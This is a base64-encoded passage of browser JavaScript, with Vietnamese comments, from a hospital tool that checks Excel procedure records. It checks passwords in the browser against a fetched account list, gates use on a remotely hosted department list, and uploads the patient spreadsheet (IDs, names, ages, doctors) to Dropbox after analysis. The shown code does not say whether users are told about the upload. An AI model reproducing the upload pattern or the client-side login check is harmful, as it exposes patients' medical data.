OKchSBUaMOqbSBkw7JuZyBuw6B5DQogICAgY29uc3QgbG9naW5TZWN0aW9uVmlzaWJsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpblNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ICE9PSAnbm9uZSc7DQogICAgY29uc3Qgc3RpbGxMb2FkaW5nID0gYnRuTG9naW4uaW5uZXJIVE1MLmluY2x1ZGVzKCfEkGFuZyDEkcSDbmcgbmjhuq1wJyk7DQogICAgaWYgKGxvZ2luU2VjdGlvblZpc2libGUgJiYgc3RpbGxMb2FkaW5nKSB7DQogICAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSBgDQogICAgICAgIDxpIGNsYXNzPSJmYXMgZmEtc2F0ZWxsaXRlLWRpc2ggZmEtc3BpbiIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOiNlNjdlMjI7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICAgIDxzdHJvbmc+xJDGsOG7nW5nIHRydXnhu4FuIGdpw6FuIMSRb+G6oW48L3N0cm9uZz48YnIvPjxici8+DQogICAgICAgIFZ1aSBsw7JuZyDEkeG7o2kgdsOgaSBnacOieSDEkeG7gyBraOG7n2kgxJHhu5luZyBtw6F5IGNo4bunIGThu7EgcGjDsm5nLi4uDQogICAgICBgOw0KICAgICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMCUnOw0KICAgICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICAgIHJlcXVlc3RBbmltYXRpb25GcmFtZSgoKSA9PiBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93JykpOw0KICAgICAgbG9naW5Qb3B1cFNob3duID0gdHJ1ZTsNCiAgICBsZXQgcGVyY2VudCA9IDA7DQpwcm9ncmVzc0Jhci5zdHlsZS50cmFuc2l0aW9uID0gJ3dpZHRoIDAuMnMgbGluZWFyJzsNCmNvbnN0IHByb2dyZXNzVGltZXIgPSBzZXRJbnRlcnZhbCgoKSA9PiB7DQogICAgcGVyY2VudCArPSAyOyAvLyB0xINuZyBt4buXaSBs4bqnbiAyJQ0KICAgIGlmIChwZXJjZW50ID4gMTAwKSB7DQogICAgICAgIHBlcmNlbnQgPSAxMDA7DQogICAgICAgIGNsZWFySW50ZXJ2YWwocHJvZ3Jlc3NUaW1lcik7DQogICAgfQ0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gcGVyY2VudCArICclJzsNCn0sIDUwMCk7IC8vIDEwMG1zIGPhuq1wIG5o4bqtdCAxIGzhuqduDQoNCgkNCgl9DQogIH0sIDIwMDApOw0KDQogIHRyeSB7DQogICAgY29uc3QgYWNjb3VudHMgPSBhd2FpdCBsb2FkQWNjb3VudHNGcm9tVFhUKCk7DQogICAgaWYgKGFjY291bnRzW3VzZXJuYW1lXSAmJiBhY2NvdW50c1t1c2VybmFtZV0gPT09IHBhc3N3b3JkKSB7DQogICAgICBjdXJyZW50VXNlciA9IHVzZXJuYW1lOw0KICAgICAgc2Vzc2lvblN0b3JhZ2Uuc2V0SXRlbSgnbWVkVXNlcicsIHVzZXJuYW1lKTsNCiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpblNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21haW5Db250ZW50Jykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICBsb2dpbkVycm9yLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICBkb2N1bWVudC5ib2R5LmNsYXNzTGlzdC5yZW1vdmUoJ2xvZ2luLXBhZ2UnKTsNCg0KICAgICAgYXdhaXQgaW5pdEFmdGVyTG9naW4oKTsgLy8gY2jhu4kgbG9hZCBzYXUga2hpIGxvZ2luIHRow6BuaCBjw7RuZw0KICAgIH0gZWxzZSB7DQogICAgICBsb2dpbkVycm9yLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIH0NCiAgfSBjYXRjaCAoZXJyKSB7DQogICAgY29uc29sZS5lcnJvcignTOG7l2kga2hpIMSRxINuZyBuaOG6rXA6JywgZXJyKTsNCiAgICBsb2dpbkVycm9yLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICB9IGZpbmFsbHkgew0KICAgIGNsZWFyVGltZW91dChzbG93TG9naW5UaW1lcik7DQoNCiAgICAvLyBO4bq/dSBwb3B1cCBkbyBsb2dpbiBt4bufIHRow6wgxJHDs25nDQogICAgaWYgKGxvZ2luUG9wdXBTaG93biAmJiBwb3B1cCkgew0KICAgICAgcG9wdXAuY2xhc3NMaXN0LnJlbW92ZSgnc2hvdycpOw0KICAgICAgc2V0VGltZW91dCgoKSA9PiB7IHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7IH0sIDQwMCk7DQogICAgfQ0KDQogICAgYnRuTG9naW4uZGlzYWJsZWQgPSBmYWxzZTsNCiAgICBidG5Mb2dpbi5pbm5lckhUTUwgPSAnxJDEg25nIG5o4bqtcCc7DQogIH0NCn0NCg0KDQogICAgICAgIGZ1bmN0aW9uIGxvZ291dCgpIHsNCiAgICAgICAgICAgIGN1cnJlbnRVc2VyID0gbnVsbDsNCiAgICAgICAgICAgIHNlc3Npb25TdG9yYWdlLnJlbW92ZUl0ZW0oJ21lZFVzZXInKTsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpblNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWluQ29udGVudCcpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcm5hbWVJbnB1dCcpLnZhbHVlID0gJyc7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLnZhbHVlID0gJyc7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5FcnJvcicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgICAgICBkb2N1bWVudC5ib2R5LmNsYXNzTGlzdC5hZGQoJ2xvZ2luLXBhZ2UnKTsNCiAgICAgICAgfQ0KDQovLyA9PT09PT09PT09IEjDgE0gTE9BRCBEQU5IIFPDgUNIIEtIT0EgSOG7olAgTOG7hiA9PT09PT09PT09IC8vDQphc3luYyBmdW5jdGlvbiBsb2FkVmFsaWREZXBhcnRtZW50cygpIHsNCiAgICBjb25zdCB1cmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYXVodXluaDAxMDQvY2hhdWh1eW5oMDEwNC50eHQvcmVmcy9oZWFkcy9tYWluL2tob2EudHh0JzsNCiAgICB0cnkgew0KICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaCh1cmwpOw0KICAgICAgICBjb25zdCB0ZXh0ID0gYXdhaXQgcmVzLnRleHQoKTsNCiAgICAgICAgY29uc3Qga2hvYUxpc3QgPSB0ZXh0LnNwbGl0KCdcbicpLm1hcChsaW5lID0+IGxpbmUudHJpbSgpLnRvTG93ZXJDYXNlKCkpLmZpbHRlcihCb29sZWFuKTsNCiAgICAgICAgcmV0dXJuIGtob2FMaXN0Ow0KICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICBjb25zb2xlLmVycm9yKCJLaMO0bmcgdGjhu4MgdOG6o2kgZGFuaCBzw6FjaCBraG9hOiIsIGVycik7DQogICAgICAgIHJldHVybiBbXTsNCiAgICB9DQp9DQoNCiAgICAgICAgLy8gPT09PT09PT09PSBQSOG6pk4gWOG7rCBMw50gRklMRSA9PT09PT09PT09IC8vDQpmdW5jdGlvbiBoYW5kbGVGaWxlKCkgew0KICAgIGNvbnN0IGZpbGVJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKTsNCiAgICBjb25zdCBhbmFseXplQnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FuYWx5emVCdG4nKTsNCiAgICBjb25zdCBmaWxlID0gZmlsZUlucHV0LmZpbGVzWzBdOw0KCQ0KaWYgKCFmaWxlKSB7DQogICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgY29uc3QgbG9hZGluZ1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1RleHQnKTsNCiAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gYA0KICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6cmVkO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPg0KICAgICAgICA8c3Ryb25nPlZ1aSBsw7JuZyBjaOG7jW4gZmlsZSB0csaw4bubYyBraGkga2nhu4NtIHRyYTwvc3Ryb25nPjxici8+PGJyLz4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJykuc3R5bGUuZGlzcGxheT0nbm9uZSciPsSQw7NuZzwvYnV0dG9uPg0KICAgIGA7DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMCUnOw0KICAgIA0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpOw0KICAgIHJldHVybjsNCn0NCg0KDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVSZXF1aXJlbWVudHMnKS5jbGFzc0xpc3QuYWRkKCdoaWRkZW4nKTsNCiAgICBlcnJvckxvZyA9IFtdOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRTZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JTZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICBhbmFseXplQnRuLmRpc2FibGVkID0gdHJ1ZTsNCiAgICBhbmFseXplQnRuLmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXNwaW5uZXIgZmEtc3BpbiI+PC9pPiDEkGFuZyBraeG7g20gdHJhLi4uJzsNCiAgICAvLyDinIUgQuG6r3QgxJHhuqd1IMSR4bq/bSAycyDEkeG7gyBoaeG7h24gcG9wdXAgbuG6v3UgduG6q24gxJFhbmcgIsSQYW5nIGtp4buDbSB0cmEuLi4iDQpjbGVhclRpbWVvdXQoYW5hbHl6ZVBvcHVwVGltZXIpOw0KYW5hbHl6ZVBvcHVwVGltZXIgPSBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICBjb25zdCBidG5BbmFseXplID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FuYWx5emVCdG4nKTsNCiAgICBpZiAoYnRuQW5hbHl6ZS5pbm5lckhUTUwuaW5jbHVkZXMoJ8SQYW5nIGtp4buDbSB0cmEnKSkgew0KICAgICAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nUG9wdXAnKTsNCiAgICAgICAgY29uc3QgbG9hZGluZ1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1RleHQnKTsNCiAgICAgICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXInKTsNCg0KICAgICAgICBsb2FkaW5nVGV4dC5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLXNhdGVsbGl0ZS1kaXNoIGljb24tc3BpbiIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOiNlNjdlMjI7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICAgICAgICA8c3Ryb25nPsSQxrDhu51uZyB0cnV54buBbiBnacOhbiDEkW/huqFuPC9zdHJvbmc+PGJyLz4NCiAgICAgICAgICAgIFZ1aSBsw7JuZyDEkeG7o2kgdsOgaSBnacOieSDEkeG7gyBraOG7n2kgxJHhu5luZyBtw6F5IGNo4bunIGThu7EgcGjDsm5nLi4uDQogICAgICAgIGA7DQogICAgICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzAlJzsNCiAgICAgICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICAgICAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKSk7DQoNCiAgICAgICAgLy8gQ2jhuqF5IHByb2dyZXNzQmFyICUNCiAgICAgICAgbGV0IHBlcmNlbnQgPSAwOw0KICAgICAgICBwcm9ncmVzc0Jhci5zdHlsZS50cmFuc2l0aW9uID0gJ3dpZHRoIDAuMnMgbGluZWFyJzsNCiAgICAgICAgY29uc3QgcHJvZ3Jlc3NUaW1lciA9IHNldEludGVydmFsKCgpID0+IHsNCiAgICAgICAgICAgIHBlcmNlbnQgKz0gMjsNCiAgICAgICAgICAgIGlmIChwZXJjZW50ID4gMTAwKSB7DQogICAgICAgICAgICAgICAgcGVyY2VudCA9IDEwMDsNCiAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKHByb2dyZXNzVGltZXIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSBwZXJjZW50ICsgJyUnOw0KICAgICAgICB9LCAxMDApOw0KICAgIH0NCn0sIDUwMDApOw0KDQogICAgY29uc3QgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCiAgICANCiAgICByZWFkZXIub25sb2FkID0gYXN5bmMgZnVuY3Rpb24oZSkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgY29uc3QgZGF0YSA9IG5ldyBVaW50OEFycmF5KGUudGFyZ2V0LnJlc3VsdCk7DQogICAgICAgICAgICBjb25zdCB3b3JrYm9vayA9IFhMU1gucmVhZChkYXRhLCB7IHR5cGU6ICdhcnJheScgfSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmICh3b3JrYm9vay5TaGVldE5hbWVzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcignRmlsZSBFeGNlbCBraMO0bmcgY8OzIHNoZWV0IG7DoG8nKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgZmlyc3RTaGVldCA9IHdvcmtib29rLlNoZWV0c1t3b3JrYm9vay5TaGVldE5hbWVzWzFdXTsNCiAgICAgICAgICAgIGNvbnN0IGpzb25EYXRhID0gWExTWC51dGlscy5zaGVldF90b19qc29uKGZpcnN0U2hlZXQsIHsgDQogICAgICAgICAgICAgICAgaGVhZGVyOiAxLCANCiAgICAgICAgICAgICAgICBkZWZ2YWw6ICIiLCANCiAgICAgICAgICAgICAgICBibGFua3Jvd3M6IHRydWUgDQogICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIGNvbnN0IGRvbmc1ID0gKGpzb25EYXRhWzRdICYmIGpzb25EYXRhWzRdWzBdKSA/IGpzb25EYXRhWzRdWzBdLnRvU3RyaW5nKCkudHJpbSgpIDogIktow7RuZyByw7UiOw0KY29uc3QgZG9uZzYgPSAoanNvbkRhdGFbNV0gJiYganNvbkRhdGFbNV1bMF0pID8ganNvbkRhdGFbNV1bMF0udG9TdHJpbmcoKS50cmltKCkgOiAiS2jDtG5nIHLDtSI7DQp3aW5kb3cubmdheVZhbHVlID0gZG9uZzU7ICAvLyDirIUgZMOybmcgNSA9IE5nw6B5DQp3aW5kb3cua2hvYVZhbHVlID0gZG9uZzY7ICAvLyDirIUgZMOybmcgNiA9IEtob2ENCg0KDQoJCQkvLy8vIEtp4buDbSB0cmEga2hvYSAvLy8vLw0KLy8g4pyFIEzhuqV5IGThu68gbGnhu4d1IGTDsm5nIDYsIGPhu5l0IEENCmNvbnN0IGtob2FSb3cgPSBqc29uRGF0YVs1XTsgLy8gZMOybmcgNg0KY29uc3Qga2hvYVRleHQgPSAoa2hvYVJvdyAmJiBraG9hUm93WzBdIHx8ICIiKS50b1N0cmluZygpLnRyaW0oKTsNCmNvbnN0IGtob2FMb3dlciA9IGtob2FUZXh0LnRvTG93ZXJDYXNlKCk7DQoNCi8vIOKchSBLaeG7g20gdHJhIHTDqm4ga2hvYQ0KY29uc3QgdmFsaWRLaG9hTGlzdCA9IGF3YWl0IGxvYWRWYWxpZERlcGFydG1lbnRzKCk7DQppZiAoIXZhbGlkS2hvYUxpc3Quc29tZShraG9hID0+IGtob2FMb3dlci5pbmNsdWRlcyhraG9hKSkpIHsNCiAgICAgIHdpbmRvdy5pc0tob2FMb2kgPSB0cnVlOw0KICAgIGNvbnN0IG1zZyA9IGDinYwgTcOheSBjaOG7pyB04burIGNo4buRaSAke2tob2FUZXh0IHx8ICdLaMO0bmcgeMOhYyDEkeG7i25oJ30gc+G7rSBk4bulbmcgcGjhuqduIG3hu4FtLiA8YnIvPlZ1aSBsw7JuZyBtdWEgYuG6o24gcXV54buBbiDEkeG7gyB0w7RuIHRy4buNbmcgdMOhYyBnaeG6oy4gYDsNCg0KICAgIC8vIEhp4buDbiBwb3B1cCBjaOG7qSBraMO0bmcgYWxlcnQNCiAvLyBIaeG7g24gdGjhu4sgcG9wdXANCiAgICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXInKTsNCg0KICAgIC8vIEhp4buDbiB0aOG7iyB0aMO0bmcgYsOhbyBs4buXaSB2xKluaCB2aeG7hW4NCiAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICA8aSBjbGFzcz0iZmFzIGZhLWJhbiIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOnJlZDtmb250LXNpemU6MjBweDttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICA8c3Ryb25nPiR7bXNnfTwvc3Ryb25nPjxici8+PGJyLz4NCiAgICA8YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJidXlMaWNlbnNlIj5NdWEgQuG6o24gUXV54buBbjwvYnV0dG9uPjxici8+PGJyLz4NCiAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9IndpbmRvdy5sb2NhdGlvbi5yZWxvYWQoKSI+xJDDs25nPC9idXR0b24+DQpgOw0KDQovLyBTYXUga2hpIHJlbmRlciBuw7p0LCB0aMOqbSBz4buxIGtp4buHbg0Kc2V0VGltZW91dCgoKSA9PiB7DQogIGNvbnN0IGJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXlMaWNlbnNlIik7DQogIGlmIChidG4pIHsNCiAgICBidG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiB7DQogICAgICAvLyDhuqhuIHBvcHVwIGzhu5dpDQogICAgICBjb25zdCBwb3B1cCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2FkaW5nUG9wdXAiKTsNCiAgICAgIGlmIChwb3B1cCkgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICJub25lIjsNCiAgICAgIC8vIE3hu58gcG9wdXAgYuG6o25nIGdpw6ENCiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXlQb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7DQogICAgfSk7DQogIH0NCn0sIDIwMCk7DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMCUnOw0KDQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7DQoNCiAgICAvLyDinIUgVsOUIEhJ4buGVSBIw5NBIGLhuqV0IGvhu7MgxJFv4bqhbiBuw6BvIGPhu5EgZ+G6r25nIOG6qW4gcG9wdXAgc2F1IMSRw7MNCiAgICB3aW5kb3cuaXNLaG9hTG9pID0gdHJ1ZTsNCg0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzY2FuU3RhdHVzJykuaW5uZXJIVE1MID0gYDxzcGFuIHN0eWxlPSJjb2xvcjpyZWQ7Zm9udC13ZWlnaHQ6Ym9sZCI+JHttc2d9PC9zcGFuPmA7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIHJldHVybjsNCn0NCg0KDQoNCgkJCQ0KICAgICAgICAgICAgaWYgKGpzb25EYXRhLmxlbmd0aCA8PSAxKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdGaWxlIEV4Y2VsIGtow7RuZyBjw7MgZOG7ryBsaeG7h3UgKGNo4buJIGPDsyB0acOqdSDEkeG7gSBob+G6t2MgdHLhu5FuZyknKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICBwcm9jZXNzRGF0YShqc29uRGF0YSk7DQogICAgICAgICAgY29uc3Qgc3RhdHMgPSB7DQogICAgICAgICAgICBoZXJiOiBnZXRIZXJiT3V0bGllclRvdGFsKCksDQogICAgICAgICAgICAgIHRpbWU6IGdldFRpbWVFcnJvclRvdGFsKCksDQogICAgICAgICAgICAgY29uZmxpY3Q6IGdldENvbmZsaWN0VG90YWwoKQ0KICAgICAgICAgIH07DQogICAgICAgICAgY29uc3QgdXBsb2FkRmlsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKS5maWxlc1swXTsNCiBhd2FpdCB1cGxvYWRUb0Ryb3Bib3godXBsb2FkRmlsZSwgd2luZG93Lmtob2FWYWx1ZSwgd2luZG93Lm5nYXlWYWx1ZSwgc3RhdHMpOw0KICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVSZXF1aXJlbWVudHMnKS5jbGFzc0xpc3QucmVtb3ZlKCdoaWRkZW4nKTsNCiAgICAgICAgICAgIGxvZ0Vycm9yKCdM4buXaSBraGkgxJHhu41jIGZpbGUgRXhjZWwnLCBudWxsLCBlcnJvci5tZXNzYWdlKTsNCiAgICAgICAgICAgIGRpc3BsYXlFcnJvcnMoKTsNCiAgICAgICAgICAgIGFsZXJ0KCdDw7MgbOG7l2kgeOG6o3kgcmEga2hpIMSR4buNYyBmaWxlOiAnICsgZXJyb3IubWVzc2FnZSk7DQogICAgICAgIH0gZmluYWxseSB7DQoJCWNsZWFyVGltZW91dChhbmFseXplUG9wdXBUaW1lcik7IC8vIOKchSBOZ+G6r3QgdGltZXIgcG9wdXANCgkJaWYgKCF3aW5kb3cuaXNLaG9hTG9pKSB7ICANCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpLmNsYXNzTGlzdC5yZW1vdmUoJ3Nob3cnKTsgLy8g4pyFIOG6qG4gcG9wdXANCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsgICAvLyDinIUg4bqobiBo4bqzbiBwb3B1cA0KCSAgfQ0KICAgICAgICAgICAgYW5hbHl6ZUJ0bi5kaXNhYmxlZCA9IGZhbHNlOw0KICAgICAgICAgICAgYW5hbHl6ZUJ0bi5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1zZWFyY2ggZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEtp4buDbSBUcmEnOw0KICAgICAgICB9DQogICAgfTsNCiAgICANCiAgICByZWFkZXIub25lcnJvciA9IGZ1bmN0aW9uKCkgew0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZVJlcXVpcmVtZW50cycpLmNsYXNzTGlzdC5yZW1vdmUoJ2hpZGRlbicpOw0KICAgICAgICBsb2dFcnJvcignTOG7l2kga2hpIMSR4buNYyBmaWxlJywgbnVsbCwgJ0tow7RuZyB0aOG7gyDEkeG7jWMgbuG7mWkgZHVuZyBmaWxlJyk7DQogICAgICAgIGRpc3BsYXlFcnJvcnMoKTsNCiAgICAgICAgYW5hbHl6ZUJ0bi5kaXNhYmxlZCA9IGZhbHNlOw0KICAgICAgICBhbmFseXplQnRuLmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXNlYXJjaCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gS2nhu4NtIFRyYSc7DQogICAgICAgIGFsZXJ0KCdM4buXaSBraGkgxJHhu41jIGZpbGUuIFZ1aSBsw7JuZyB0aOG7rSBs4bqhaSB24bubaSBmaWxlIGtow6FjLicpOw0KICAgIH07DQogICAgDQogICAgcmVhZGVyLnJlYWRBc0FycmF5QnVmZmVyKGZpbGUpOw0KfQ0KDQogICAgICAgIGZ1bmN0aW9uIHByb2Nlc3NEYXRhKGRhdGEpIHsNCiAgICANCiAgICB0cnkgew0KICAgICAgICBjb25zdCBoZWFkZXJMaW5lMSA9IGRhdGFbN10gfHwgW107DQogICAgICAgIGNvbnN0IGhlYWRlckxpbmUyID0gZGF0YVs4XSB8fCBbXTsNCiAgICAgICAgY29uc3QgY29tYmluZWRIZWFkZXJzID0gaGVhZGVyTGluZTEubWFwKChjb2wsIGluZGV4KSA9PiANCiAgICAgICAgICAgIChjb2wgKyAnICcgKyAoaGVhZGVyTGluZTJbaW5kZXhdIHx8ICcnKSkudHJpbSgpDQogICAgICAgICk7DQoNCiAgICAgICAgDQogICAgICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCIpKTsNCgkJCQljb25zdCBkYXRlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiTmfDoHkgdGjhu7FjIGhp4buHbiIpKTsgLy8gVGjDqm0gZMOybmcgbsOgeQ0KICAgICAgICAgICAgICAgIGNvbnN0IHN0YXJ0SW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IHRo4buxYyBoaeG7h24iKSk7DQogICAgICAgICAgICAgICAgY29uc3QgZW5kSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu51pIGdpYW4ga+G6v3QgdGjDumMiKSk7DQogICAgICAgICAgICAgICAgY29uc3Qgb3BlcmF0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IGNow61uaCIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBuYW1lSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiSOG7jSB0w6puIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IHBhdGllbnRJZEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIk3DoyBCTiIpKTsNCgkJCQljb25zdCBwYXRpZW50YWdlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVHXhu5VpIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IGRvY3RvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkLDoWMgc+G7uSBjaOG7iSDEkeG7i25oIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IG1pc3NpbmdDb2x1bW5zID0gW107DQogICAgICAgICAgICAgICAgaWYgKHByb2NlZHVyZUluZG